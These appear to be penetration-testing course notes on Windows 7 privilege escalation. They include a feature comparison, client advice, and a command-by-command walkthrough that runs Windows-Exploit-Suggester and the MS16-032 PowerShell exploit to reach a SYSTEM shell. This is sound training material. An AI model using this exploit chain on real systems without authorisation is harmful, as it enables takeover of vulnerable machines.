# Windows 7 — Legacy OS PrivEsc

## Windows 7 vs. Windows 10 — Security Feature Gaps

| Feature | Windows 7 | Windows 10 |
|---|---|---|
| Microsoft Password (MFA) | ✗ | ✓ |
| BitLocker | Partial | ✓ |
| Credential Guard | ✗ | ✓ |
| Remote Credential Guard | ✗ | ✓ |
| Device Guard (code integrity) | ✗ | ✓ |
| AppLocker | Partial | ✓ |
| Windows Defender | Partial | ✓ |
| Control Flow Guard | ✗ | ✓ |

**EOL date:** January 14, 2020. Still widely deployed across education, retail, transportation, healthcare, financial, government, and manufacturing sectors.

---

## Assessment Context
- As of late 2020, Windows 7 was still the **second most used desktop OS** worldwide.
- Provide context-aware recommendations — a retail chain with hundreds of POS systems running Windows 7 cannot simply "upgrade immediately." Work with the client on compensating controls (network segmentation, monitoring, custom extended support agreements).
- Always understand the business reason before recommending decommission.

---

## Exploitation Walkthrough — Windows 7

### Step 1 — Capture systeminfo output
```cmd
systeminfo > win7-systeminfo.txt
```
Save the output to your attack machine for use with Windows-Exploit-Suggester.

### Step 2 — Update the local Microsoft vulnerability database
```bash
sudo python2 windows-exploit-suggester.py --update
# Saves a local .xls file (e.g. 2021-05-13-mssb.xls)
```

### Step 3 — Run Windows-Exploit-Suggester
```bash
python2 windows-exploit-suggester.py --database 2021-05-13-mssb.xls --systeminfo win7-systeminfo.txt
```

**Output key:**
- `[E]` = ExploitDB PoC available
- `[M]` = Metasploit module available
- `[*]` = Missing bulletin (no known public exploit)

**Example notable findings for a Windows 7 SP1 x64 host with minimal patching:**
- `MS16-135` — Win32k privilege escalation
- `MS16-098` — RGNOBJ Integer Overflow
- `MS16-075` — SMB/WebDAV NTLM Reflection (Hot Potato / Rotten Potato)
- `MS16-032` — Secondary Logon Handle privesc ← **highlighted target**
- `MS13-053`, `MS13-005` — Kernel-mode driver EoP

**Filter out:** DoS-only exploits and exploits that don't apply to the target OS/architecture.

**Alternative tool (if Meterpreter session exists):**
```
use post/multi/recon/local_exploit_suggester
set SESSION <id>
run
```

### Step 4 — Exploit MS16-032 (Secondary Logon Service Bug)

A bug in the Secondary Logon Service allows an attacker to steal a SYSTEM impersonation token via a race condition in `CreateProcessWithLogonW`.

Reference: [Project Zero bug write-up](https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html)

**PowerShell PoC:**
```powershell
Set-ExecutionPolicy bypass -scope process
Import-Module .\Invoke-MS16-032.ps1
Invoke-MS16-032
```

**Output on success:**
```
[!] Holy handle leak Batman, we have a SYSTEM shell!!
```
→ New cmd console spawns as `NT AUTHORITY\SYSTEM`.

```cmd
whoami
# nt authority\system
```

---

## Key Takeaway
Windows 7 is trivially exploitable on unpatched systems — the patch gap is often years wide. The typical chain:

1. `systeminfo` → capture to file
2. `windows-exploit-suggester.py` → identify applicable exploits
3. Filter results (remove DoS, architecture mismatches)
4. Select exploit with `[M]` or `[E]` tag → MS16-032 is a reliable starting point for Windows 7 SP1 x64
5. Run PowerShell PoC or Metasploit module → SYSTEM shell

Challenge yourself to find **multiple** escalation paths — heavily unpatched Windows 7 hosts typically have many options (MS16-032, MS16-075/Hot Potato, MS15-051, kernel exploits, etc.).